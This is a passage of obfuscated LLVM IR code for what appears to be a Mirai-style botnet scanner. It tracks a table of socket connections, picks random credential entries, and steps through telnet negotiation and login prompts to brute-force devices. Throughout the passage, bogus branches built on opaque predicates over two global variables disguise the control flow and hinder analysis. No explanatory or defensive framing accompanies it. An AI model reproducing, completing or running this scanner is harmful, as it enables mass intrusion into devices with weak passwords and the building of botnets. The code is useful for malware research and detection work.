  %904 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %903, i32 0, i32 1
  %905 = load i32, i32* %904, align 8
  %906 = srem i32 %905, 64
  %907 = zext i32 %906 to i64
  %908 = shl i64 1, %907
  %909 = getelementptr inbounds %struct.fd_set.28, %struct.fd_set.28* %13, i32 0, i32 0
  %910 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %911 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %910, i32 0, i32 1
  %912 = load i32, i32* %911, align 8
  %913 = sdiv i32 %912, 64
  %914 = sext i32 %913 to i64
  %915 = getelementptr inbounds [16 x i64], [16 x i64]* %909, i64 0, i64 %914
  %916 = load i64, i64* %915, align 8
  %917 = or i64 %916, %908
  store i64 %917, i64* %915, align 8
  %918 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %919 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %918, i32 0, i32 1
  %920 = load i32, i32* %919, align 8
  %921 = load i32, i32* %19, align 4
  %922 = icmp sgt i32 %920, %921
  %923 = load i32, i32* @x.63
  %924 = load i32, i32* @y.64
  %925 = sub i32 %923, 1
  %926 = mul i32 %923, %925
  %927 = urem i32 %926, 2
  %928 = icmp eq i32 %927, 0
  %929 = icmp slt i32 %924, 10
  %930 = or i1 %928, %929
  br i1 %930, label %originalBBpart2183, label %originalBB151alteredBB

originalBBpart2183:                               ; preds = %originalBB151
  br i1 %922, label %931, label %951

; <label>:931:                                    ; preds = %originalBBpart2183
  %932 = load i32, i32* @x.63
  %933 = load i32, i32* @y.64
  %934 = sub i32 %932, 1
  %935 = mul i32 %932, %934
  %936 = urem i32 %935, 2
  %937 = icmp eq i32 %936, 0
  %938 = icmp slt i32 %933, 10
  %939 = or i1 %937, %938
  br i1 %939, label %originalBB185, label %originalBB185alteredBB

originalBB185:                                    ; preds = %originalBB185alteredBB, %931
  %940 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %941 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %940, i32 0, i32 1
  %942 = load i32, i32* %941, align 8
  store i32 %942, i32* %19, align 4
  %943 = load i32, i32* @x.63
  %944 = load i32, i32* @y.64
  %945 = sub i32 %943, 1
  %946 = mul i32 %943, %945
  %947 = urem i32 %946, 2
  %948 = icmp eq i32 %947, 0
  %949 = icmp slt i32 %944, 10
  %950 = or i1 %948, %949
  br i1 %950, label %originalBBpart2187, label %originalBB185alteredBB

originalBBpart2187:                               ; preds = %originalBB185
  br label %951

; <label>:951:                                    ; preds = %originalBBpart2187, %originalBBpart2183
  %952 = load i32, i32* @x.63
  %953 = load i32, i32* @y.64
  %954 = sub i32 %952, 1
  %955 = mul i32 %952, %954
  %956 = urem i32 %955, 2
  %957 = icmp eq i32 %956, 0
  %958 = icmp slt i32 %953, 10
  %959 = or i1 %957, %958
  br i1 %959, label %originalBB189, label %originalBB189alteredBB

originalBB189:                                    ; preds = %originalBB189alteredBB, %951
  %960 = load i32, i32* @x.63
  %961 = load i32, i32* @y.64
  %962 = sub i32 %960, 1
  %963 = mul i32 %960, %962
  %964 = urem i32 %963, 2
  %965 = icmp eq i32 %964, 0
  %966 = icmp slt i32 %961, 10
  %967 = or i1 %965, %966
  br i1 %967, label %originalBBpart2191, label %originalBB189alteredBB

originalBBpart2191:                               ; preds = %originalBB189
  br label %968

; <label>:968:                                    ; preds = %originalBBpart2191, %889
  br label %969

; <label>:969:                                    ; preds = %968, %originalBBpart2149
  br label %970

; <label>:970:                                    ; preds = %969, %809
  %971 = load i32, i32* %9, align 4
  %972 = add nsw i32 %971, 1
  store i32 %972, i32* %9, align 4
  br label %705

; <label>:973:                                    ; preds = %705
  %974 = getelementptr inbounds %struct.timeval.29, %struct.timeval.29* %16, i32 0, i32 1
  store i64 0, i64* %974, align 8
  %975 = getelementptr inbounds %struct.timeval.29, %struct.timeval.29* %16, i32 0, i32 0
  store i64 1, i64* %975, align 8
  %976 = load i32, i32* %20, align 4
  %977 = load i32, i32* %19, align 4
  %978 = icmp sgt i32 %976, %977
  br i1 %978, label %979, label %981

; <label>:979:                                    ; preds = %973
  %980 = load i32, i32* %20, align 4
  br label %983

; <label>:981:                                    ; preds = %973
  %982 = load i32, i32* %19, align 4
  br label %983

; <label>:983:                                    ; preds = %981, %979
  %984 = phi i32 [ %980, %979 ], [ %982, %981 ]
  %985 = add nsw i32 1, %984
  %986 = call i32 @select(i32 %985, %struct.fd_set.28* %13, %struct.fd_set.28* %14, %struct.fd_set.28* null, %struct.timeval.29* %16)
  store i32 %986, i32* %21, align 4
  %987 = call i64 @time(i64* null) #6
  %988 = trunc i64 %987 to i32
  store i32 %988, i32* @fake_time, align 4
  store i32 0, i32* %9, align 4
  br label %989

; <label>:989:                                    ; preds = %1888, %983
  %990 = load i32, i32* %9, align 4
  %991 = icmp slt i32 %990, 256
  br i1 %991, label %992, label %1891

; <label>:992:                                    ; preds = %989
  %993 = load i32, i32* @x.63
  %994 = load i32, i32* @y.64
  %995 = sub i32 %993, 1
  %996 = mul i32 %993, %995
  %997 = urem i32 %996, 2
  %998 = icmp eq i32 %997, 0
  %999 = icmp slt i32 %994, 10
  %1000 = or i1 %998, %999
  br i1 %1000, label %originalBB193, label %originalBB193alteredBB

originalBB193:                                    ; preds = %originalBB193alteredBB, %992
  %1001 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %1002 = load i32, i32* %9, align 4
  %1003 = sext i32 %1002 to i64
  %1004 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1001, i64 %1003
  store %struct.scanner_connection* %1004, %struct.scanner_connection** %15, align 8
  %1005 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1006 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1005, i32 0, i32 1
  %1007 = load i32, i32* %1006, align 8
  %1008 = icmp eq i32 %1007, -1
  %1009 = load i32, i32* @x.63
  %1010 = load i32, i32* @y.64
  %1011 = sub i32 %1009, 1
  %1012 = mul i32 %1009, %1011
  %1013 = urem i32 %1012, 2
  %1014 = icmp eq i32 %1013, 0
  %1015 = icmp slt i32 %1010, 10
  %1016 = or i1 %1014, %1015
  br i1 %1016, label %originalBBpart2195, label %originalBB193alteredBB

originalBBpart2195:                               ; preds = %originalBB193
  br i1 %1008, label %1017, label %1018

; <label>:1017:                                   ; preds = %originalBBpart2195
  br label %1888

; <label>:1018:                                   ; preds = %originalBBpart2195
  %1019 = getelementptr inbounds %struct.fd_set.28, %struct.fd_set.28* %14, i32 0, i32 0
  %1020 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1021 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1020, i32 0, i32 1
  %1022 = load i32, i32* %1021, align 8
  %1023 = sdiv i32 %1022, 64
  %1024 = sext i32 %1023 to i64
  %1025 = getelementptr inbounds [16 x i64], [16 x i64]* %1019, i64 0, i64 %1024
  %1026 = load i64, i64* %1025, align 8
  %1027 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1028 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1027, i32 0, i32 1
  %1029 = load i32, i32* %1028, align 8
  %1030 = srem i32 %1029, 64
  %1031 = zext i32 %1030 to i64
  %1032 = shl i64 1, %1031
  %1033 = and i64 %1026, %1032
  %1034 = icmp ne i64 %1033, 0
  br i1 %1034, label %1035, label %1114

; <label>:1035:                                   ; preds = %1018
  %1036 = load i32, i32* @x.63
  %1037 = load i32, i32* @y.64
  %1038 = sub i32 %1036, 1
  %1039 = mul i32 %1036, %1038
  %1040 = urem i32 %1039, 2
  %1041 = icmp eq i32 %1040, 0
  %1042 = icmp slt i32 %1037, 10
  %1043 = or i1 %1041, %1042
  br i1 %1043, label %originalBB197, label %originalBB197alteredBB

originalBB197:                                    ; preds = %originalBB197alteredBB, %1035
  store i32 0, i32* %37, align 4
  store i32 0, i32* %38, align 4
  store i32 4, i32* %39, align 4
  %1044 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1045 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1044, i32 0, i32 1
  %1046 = load i32, i32* %1045, align 8
  %1047 = bitcast i32* %37 to i8*
  %1048 = call i32 @getsockopt(i32 %1046, i32 1, i32 4, i8* %1047, i32* %39) #6
  store i32 %1048, i32* %38, align 4
  %1049 = load i32, i32* %37, align 4
  %1050 = icmp eq i32 %1049, 0
  %1051 = load i32, i32* @x.63
  %1052 = load i32, i32* @y.64
  %1053 = sub i32 %1051, 1
  %1054 = mul i32 %1051, %1053
  %1055 = urem i32 %1054, 2
  %1056 = icmp eq i32 %1055, 0
  %1057 = icmp slt i32 %1052, 10
  %1058 = or i1 %1056, %1057
  br i1 %1058, label %originalBBpart2199, label %originalBB197alteredBB

originalBBpart2199:                               ; preds = %originalBB197
  br i1 %1050, label %1059, label %1086

; <label>:1059:                                   ; preds = %originalBBpart2199
  %1060 = load i32, i32* %38, align 4
  %1061 = icmp eq i32 %1060, 0
  br i1 %1061, label %1062, label %1086

; <label>:1062:                                   ; preds = %1059
  %1063 = load i32, i32* @x.63
  %1064 = load i32, i32* @y.64
  %1065 = sub i32 %1063, 1
  %1066 = mul i32 %1063, %1065
  %1067 = urem i32 %1066, 2
  %1068 = icmp eq i32 %1067, 0
  %1069 = icmp slt i32 %1064, 10
  %1070 = or i1 %1068, %1069
  br i1 %1070, label %originalBB201, label %originalBB201alteredBB

originalBB201:                                    ; preds = %originalBB201alteredBB, %1062
  %1071 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1072 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1071, i32 0, i32 3
  store i32 2, i32* %1072, align 8
  %1073 = call %struct.scanner_auth* @random_auth_entry()
  %1074 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1075 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1074, i32 0, i32 0
  store %struct.scanner_auth* %1073, %struct.scanner_auth** %1075, align 8
  %1076 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1077 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1076, i32 0, i32 6
  store i32 0, i32* %1077, align 4
  %1078 = load i32, i32* @x.63
  %1079 = load i32, i32* @y.64
  %1080 = sub i32 %1078, 1
  %1081 = mul i32 %1078, %1080
  %1082 = urem i32 %1081, 2
  %1083 = icmp eq i32 %1082, 0
  %1084 = icmp slt i32 %1079, 10
  %1085 = or i1 %1083, %1084
  br i1 %1085, label %originalBBpart2203, label %originalBB201alteredBB

originalBBpart2203:                               ; preds = %originalBB201
  br label %1097

; <label>:1086:                                   ; preds = %1059, %originalBBpart2199
  %1087 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1088 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1087, i32 0, i32 1
  %1089 = load i32, i32* %1088, align 8
  %1090 = call i32 @close(i32 %1089)
  %1091 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1092 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1091, i32 0, i32 1
  store i32 -1, i32* %1092, align 8
  %1093 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1094 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1093, i32 0, i32 8
  store i8 0, i8* %1094, align 8
  %1095 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1096 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1095, i32 0, i32 3
  store i32 0, i32* %1096, align 8
  br label %1888

; <label>:1097:                                   ; preds = %originalBBpart2203
  %1098 = load i32, i32* @x.63
  %1099 = load i32, i32* @y.64
  %1100 = sub i32 %1098, 1
  %1101 = mul i32 %1098, %1100
  %1102 = urem i32 %1101, 2
  %1103 = icmp eq i32 %1102, 0
  %1104 = icmp slt i32 %1099, 10
  %1105 = or i1 %1103, %1104
  br i1 %1105, label %originalBB205, label %originalBB205alteredBB

originalBB205:                                    ; preds = %originalBB205alteredBB, %1097
  %1106 = load i32, i32* @x.63
  %1107 = load i32, i32* @y.64
  %1108 = sub i32 %1106, 1
  %1109 = mul i32 %1106, %1108
  %1110 = urem i32 %1109, 2
  %1111 = icmp eq i32 %1110, 0
  %1112 = icmp slt i32 %1107, 10
  %1113 = or i1 %1111, %1112
  br i1 %1113, label %originalBBpart2207, label %originalBB205alteredBB

originalBBpart2207:                               ; preds = %originalBB205
  br label %1114

; <label>:1114:                                   ; preds = %originalBBpart2207, %1018
  %1115 = load i32, i32* @x.63
  %1116 = load i32, i32* @y.64
  %1117 = sub i32 %1115, 1
  %1118 = mul i32 %1115, %1117
  %1119 = urem i32 %1118, 2
  %1120 = icmp eq i32 %1119, 0
  %1121 = icmp slt i32 %1116, 10
  %1122 = or i1 %1120, %1121
  br i1 %1122, label %originalBB209, label %originalBB209alteredBB

originalBB209:                                    ; preds = %originalBB209alteredBB, %1114
  %1123 = getelementptr inbounds %struct.fd_set.28, %struct.fd_set.28* %13, i32 0, i32 0
  %1124 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1125 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1124, i32 0, i32 1
  %1126 = load i32, i32* %1125, align 8
  %1127 = sdiv i32 %1126, 64
  %1128 = sext i32 %1127 to i64
  %1129 = getelementptr inbounds [16 x i64], [16 x i64]* %1123, i64 0, i64 %1128
  %1130 = load i64, i64* %1129, align 8
  %1131 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1132 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1131, i32 0, i32 1
  %1133 = load i32, i32* %1132, align 8
  %1134 = srem i32 %1133, 64
  %1135 = zext i32 %1134 to i64
  %1136 = shl i64 1, %1135
  %1137 = and i64 %1130, %1136
  %1138 = icmp ne i64 %1137, 0
  %1139 = load i32, i32* @x.63
  %1140 = load i32, i32* @y.64
  %1141 = sub i32 %1139, 1
  %1142 = mul i32 %1139, %1141
  %1143 = urem i32 %1142, 2
  %1144 = icmp eq i32 %1143, 0
  %1145 = icmp slt i32 %1140, 10
  %1146 = or i1 %1144, %1145
  br i1 %1146, label %originalBBpart2243, label %originalBB209alteredBB

originalBBpart2243:                               ; preds = %originalBB209
  br i1 %1138, label %1147, label %1871

; <label>:1147:                                   ; preds = %originalBBpart2243
  br label %1148

; <label>:1148:                                   ; preds = %1869, %1147
  %1149 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1150 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1149, i32 0, i32 3
  %1151 = load i32, i32* %1150, align 8
  %1152 = icmp eq i32 %1151, 0
  br i1 %1152, label %1153, label %1154

; <label>:1153:                                   ; preds = %1148
  br label %1870

; <label>:1154:                                   ; preds = %1148
  %1155 = load i32, i32* @x.63
  %1156 = load i32, i32* @y.64
  %1157 = sub i32 %1155, 1
  %1158 = mul i32 %1155, %1157
  %1159 = urem i32 %1158, 2
  %1160 = icmp eq i32 %1159, 0
  %1161 = icmp slt i32 %1156, 10
  %1162 = or i1 %1160, %1161
  br i1 %1162, label %originalBB245, label %originalBB245alteredBB

originalBB245:                                    ; preds = %originalBB245alteredBB, %1154
  %1163 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1164 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1163, i32 0, i32 6
  %1165 = load i32, i32* %1164, align 4
  %1166 = icmp eq i32 %1165, 256
  %1167 = load i32, i32* @x.63
  %1168 = load i32, i32* @y.64
  %1169 = sub i32 %1167, 1
  %1170 = mul i32 %1167, %1169
  %1171 = urem i32 %1170, 2
  %1172 = icmp eq i32 %1171, 0
  %1173 = icmp slt i32 %1168, 10
  %1174 = or i1 %1172, %1173
  br i1 %1174, label %originalBBpart2247, label %originalBB245alteredBB

originalBBpart2247:                               ; preds = %originalBB245
  br i1 %1166, label %1175, label %1203

; <label>:1175:                                   ; preds = %originalBBpart2247
  %1176 = load i32, i32* @x.63
  %1177 = load i32, i32* @y.64
  %1178 = sub i32 %1176, 1
  %1179 = mul i32 %1176, %1178
  %1180 = urem i32 %1179, 2
  %1181 = icmp eq i32 %1180, 0
  %1182 = icmp slt i32 %1177, 10
  %1183 = or i1 %1181, %1182
  br i1 %1183, label %originalBB249, label %originalBB249alteredBB

originalBB249:                                    ; preds = %originalBB249alteredBB, %1175
  %1184 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1185 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1184, i32 0, i32 7
  %1186 = getelementptr inbounds [256 x i8], [256 x i8]* %1185, i32 0, i32 0
  %1187 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1188 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1187, i32 0, i32 7
  %1189 = getelementptr inbounds [256 x i8], [256 x i8]* %1188, i32 0, i32 0
  %1190 = getelementptr inbounds i8, i8* %1189, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1186, i8* %1190, i64 192, i32 1, i1 false)
  %1191 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1192 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1191, i32 0, i32 6
  %1193 = load i32, i32* %1192, align 4
  %1194 = sub nsw i32 %1193, 64
  store i32 %1194, i32* %1192, align 4
  %1195 = load i32, i32* @x.63
  %1196 = load i32, i32* @y.64
  %1197 = sub i32 %1195, 1
  %1198 = mul i32 %1195, %1197
  %1199 = urem i32 %1198, 2
  %1200 = icmp eq i32 %1199, 0
  %1201 = icmp slt i32 %1196, 10
  %1202 = or i1 %1200, %1201
  br i1 %1202, label %originalBBpart2253, label %originalBB249alteredBB

originalBBpart2253:                               ; preds = %originalBB249
  br label %1203

; <label>:1203:                                   ; preds = %originalBBpart2253, %originalBBpart2247
  %1204 = load i32, i32* @x.63
  %1205 = load i32, i32* @y.64
  %1206 = sub i32 %1204, 1
  %1207 = mul i32 %1204, %1206
  %1208 = urem i32 %1207, 2
  %1209 = icmp eq i32 %1208, 0
  %1210 = icmp slt i32 %1205, 10
  %1211 = or i1 %1209, %1210
  br i1 %1211, label %originalBB255, label %originalBB255alteredBB

originalBB255:                                    ; preds = %originalBB255alteredBB, %1203
  %1212 = call i32* @__errno_location() #7
  store i32 0, i32* %1212, align 4
  %1213 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1214 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1213, i32 0, i32 1
  %1215 = load i32, i32* %1214, align 8
  %1216 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1217 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1216, i32 0, i32 7
  %1218 = getelementptr inbounds [256 x i8], [256 x i8]* %1217, i32 0, i32 0
  %1219 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1220 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1219, i32 0, i32 6
  %1221 = load i32, i32* %1220, align 4
  %1222 = sext i32 %1221 to i64
  %1223 = getelementptr inbounds i8, i8* %1218, i64 %1222
  %1224 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1225 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1224, i32 0, i32 6
  %1226 = load i32, i32* %1225, align 4
  %1227 = sub nsw i32 256, %1226
  %1228 = call i32 @recv_strip_null(i32 %1215, i8* %1223, i32 %1227, i32 16384)
  store i32 %1228, i32* %40, align 4
  %1229 = load i32, i32* %40, align 4
  %1230 = icmp eq i32 %1229, 0
  %1231 = load i32, i32* @x.63
  %1232 = load i32, i32* @y.64
  %1233 = sub i32 %1231, 1
  %1234 = mul i32 %1231, %1233
  %1235 = urem i32 %1234, 2
  %1236 = icmp eq i32 %1235, 0
  %1237 = icmp slt i32 %1232, 10
  %1238 = or i1 %1236, %1237
  br i1 %1238, label %originalBBpart2269, label %originalBB255alteredBB

originalBBpart2269:                               ; preds = %originalBB255
  br i1 %1230, label %1239, label %1241

; <label>:1239:                                   ; preds = %originalBBpart2269
  %1240 = call i32* @__errno_location() #7
  store i32 104, i32* %1240, align 4
  store i32 -1, i32* %40, align 4
  br label %1241

; <label>:1241:                                   ; preds = %1239, %originalBBpart2269
  %1242 = load i32, i32* %40, align 4
  %1243 = icmp eq i32 %1242, -1
  br i1 %1243, label %1244, label %1306

; <label>:1244:                                   ; preds = %1241
  %1245 = load i32, i32* @x.63
  %1246 = load i32, i32* @y.64
  %1247 = sub i32 %1245, 1
  %1248 = mul i32 %1245, %1247
  %1249 = urem i32 %1248, 2
  %1250 = icmp eq i32 %1249, 0
  %1251 = icmp slt i32 %1246, 10
  %1252 = or i1 %1250, %1251
  br i1 %1252, label %originalBB271, label %originalBB271alteredBB

originalBB271:                                    ; preds = %originalBB271alteredBB, %1244
  %1253 = call i32* @__errno_location() #7
  %1254 = load i32, i32* %1253, align 4
  %1255 = icmp ne i32 %1254, 11
  %1256 = load i32, i32* @x.63
  %1257 = load i32, i32* @y.64
  %1258 = sub i32 %1256, 1
  %1259 = mul i32 %1256, %1258
  %1260 = urem i32 %1259, 2
  %1261 = icmp eq i32 %1260, 0
  %1262 = icmp slt i32 %1257, 10
  %1263 = or i1 %1261, %1262
  br i1 %1263, label %originalBBpart2273, label %originalBB271alteredBB

originalBBpart2273:                               ; preds = %originalBB271
  br i1 %1255, label %1264, label %1305

; <label>:1264:                                   ; preds = %originalBBpart2273
  %1265 = call i32* @__errno_location() #7
  %1266 = load i32, i32* %1265, align 4
  %1267 = icmp ne i32 %1266, 11
  br i1 %1267, label %1268, label %1305

; <label>:1268:                                   ; preds = %1264
  %1269 = load i32, i32* @x.63
  %1270 = load i32, i32* @y.64
  %1271 = sub i32 %1269, 1
  %1272 = mul i32 %1269, %1271
  %1273 = urem i32 %1272, 2
  %1274 = icmp eq i32 %1273, 0
  %1275 = icmp slt i32 %1270, 10
  %1276 = or i1 %1274, %1275
  br i1 %1276, label %originalBB275, label %originalBB275alteredBB

originalBB275:                                    ; preds = %originalBB275alteredBB, %1268
  %1277 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1278 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1277, i32 0, i32 1
  %1279 = load i32, i32* %1278, align 8
  %1280 = call i32 @close(i32 %1279)
  %1281 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1282 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1281, i32 0, i32 1
  store i32 -1, i32* %1282, align 8
  %1283 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1284 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1283, i32 0, i32 8
  %1285 = load i8, i8* %1284, align 8
  %1286 = add i8 %1285, 1
  store i8 %1286, i8* %1284, align 8
  %1287 = zext i8 %1286 to i32
  %1288 = icmp sge i32 %1287, 10
  %1289 = load i32, i32* @x.63
  %1290 = load i32, i32* @y.64
  %1291 = sub i32 %1289, 1
  %1292 = mul i32 %1289, %1291
  %1293 = urem i32 %1292, 2
  %1294 = icmp eq i32 %1293, 0
  %1295 = icmp slt i32 %1290, 10
  %1296 = or i1 %1294, %1295
  br i1 %1296, label %originalBBpart2282, label %originalBB275alteredBB

originalBBpart2282:                               ; preds = %originalBB275
  br i1 %1288, label %1297, label %1302

; <label>:1297:                                   ; preds = %originalBBpart2282
  %1298 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1299 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1298, i32 0, i32 8
  store i8 0, i8* %1299, align 8
  %1300 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1301 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1300, i32 0, i32 3
  store i32 0, i32* %1301, align 8
  br label %1304

; <label>:1302:                                   ; preds = %originalBBpart2282
  %1303 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  call void @setup_connection(%struct.scanner_connection* %1303)
  br label %1304

; <label>:1304:                                   ; preds = %1302, %1297
  br label %1305

; <label>:1305:                                   ; preds = %1304, %1264, %originalBBpart2273
  br label %1870

; <label>:1306:                                   ; preds = %1241
  %1307 = load i32, i32* %40, align 4
  %1308 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1309 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1308, i32 0, i32 6
  %1310 = load i32, i32* %1309, align 4
  %1311 = add nsw i32 %1310, %1307
  store i32 %1311, i32* %1309, align 4
  %1312 = load i32, i32* @fake_time, align 4
  %1313 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1314 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1313, i32 0, i32 2
  store i32 %1312, i32* %1314, align 4
  br label %1315

; <label>:1315:                                   ; preds = %1868, %1306
  %1316 = load i32, i32* @x.63
  %1317 = load i32, i32* @y.64
  %1318 = sub i32 %1316, 1
  %1319 = mul i32 %1316, %1318
  %1320 = urem i32 %1319, 2
  %1321 = icmp eq i32 %1320, 0
  %1322 = icmp slt i32 %1317, 10
  %1323 = or i1 %1321, %1322
  br i1 %1323, label %originalBB284, label %originalBB284alteredBB

originalBB284:                                    ; preds = %originalBB284alteredBB, %1315
  store i32 0, i32* %41, align 4
  %1324 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1325 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1324, i32 0, i32 3
  %1326 = load i32, i32* %1325, align 8
  %1327 = load i32, i32* @x.63
  %1328 = load i32, i32* @y.64
  %1329 = sub i32 %1327, 1
  %1330 = mul i32 %1327, %1329
  %1331 = urem i32 %1330, 2
  %1332 = icmp eq i32 %1331, 0
  %1333 = icmp slt i32 %1328, 10
  %1334 = or i1 %1332, %1333
  br i1 %1334, label %originalBBpart2286, label %originalBB284alteredBB

originalBBpart2286:                               ; preds = %originalBB284
  switch i32 %1326, label %1818 [
    i32 2, label %1335
    i32 3, label %1375
    i32 4, label %1402
    i32 5, label %1429
    i32 6, label %1481
    i32 7, label %1549
    i32 8, label %1601
    i32 9, label %1653
    i32 10, label %1689
  ]

; <label>:1335:                                   ; preds = %originalBBpart2286
  %1336 = load i32, i32* @x.63
  %1337 = load i32, i32* @y.64
  %1338 = sub i32 %1336, 1
  %1339 = mul i32 %1336, %1338
  %1340 = urem i32 %1339, 2
  %1341 = icmp eq i32 %1340, 0
  %1342 = icmp slt i32 %1337, 10
  %1343 = or i1 %1341, %1342
  br i1 %1343, label %originalBB288, label %originalBB288alteredBB

originalBB288:                                    ; preds = %originalBB288alteredBB, %1335
  %1344 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1345 = call i32 @consume_iacs(%struct.scanner_connection* %1344)
  store i32 %1345, i32* %41, align 4
  %1346 = icmp sgt i32 %1345, 0
  %1347 = load i32, i32* @x.63
  %1348 = load i32, i32* @y.64
  %1349 = sub i32 %1347, 1
  %1350 = mul i32 %1347, %1349
  %1351 = urem i32 %1350, 2
  %1352 = icmp eq i32 %1351, 0
  %1353 = icmp slt i32 %1348, 10
  %1354 = or i1 %1352, %1353
  br i1 %1354, label %originalBBpart2290, label %originalBB288alteredBB

originalBBpart2290:                               ; preds = %originalBB288
  br i1 %1346, label %1355, label %1358

; <label>:1355:                                   ; preds = %originalBBpart2290
  %1356 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1357 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1356, i32 0, i32 3
  store i32 3, i32* %1357, align 8
  br label %1358

; <label>:1358:                                   ; preds = %1355, %originalBBpart2290
  %1359 = load i32, i32* @x.63
  %1360 = load i32, i32* @y.64
  %1361 = sub i32 %1359, 1
  %1362 = mul i32 %1359, %1361
  %1363 = urem i32 %1362, 2
  %1364 = icmp eq i32 %1363, 0
  %1365 = icmp slt i32 %1360, 10
  %1366 = or i1 %1364, %1365
  br i1 %1366, label %originalBB292, label %originalBB292alteredBB

originalBB292:                                    ; preds = %originalBB292alteredBB, %1358
  %1367 = load i32, i32* @x.63
  %1368 = load i32, i32* @y.64
  %1369 = sub i32 %1367, 1
  %1370 = mul i32 %1367, %1369
  %1371 = urem i32 %1370, 2
  %1372 = icmp eq i32 %1371, 0
  %1373 = icmp slt i32 %1368, 10
  %1374 = or i1 %1372, %1373
  br i1 %1374, label %originalBBpart2294, label %originalBB292alteredBB

originalBBpart2294:                               ; preds = %originalBB292
  br label %1819

; <label>:1375:                                   ; preds = %originalBBpart2286
  %1376 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1377 = call i32 @consume_user_prompt(%struct.scanner_connection* %1376)
  store i32 %1377, i32* %41, align 4
  %1378 = icmp sgt i32 %1377, 0
  br i1 %1378, label %1379, label %1401

; <label>:1379:                                   ; preds = %1375
  %1380 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1381 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1380, i32 0, i32 1
  %1382 = load i32, i32* %1381, align 8
  %1383 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1384 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1383, i32 0, i32 0
  %1385 = load %struct.scanner_auth*, %struct.scanner_auth** %1384, align 8
  %1386 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %1385, i32 0, i32 0
  %1387 = load i8*, i8** %1386, align 8
  %1388 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
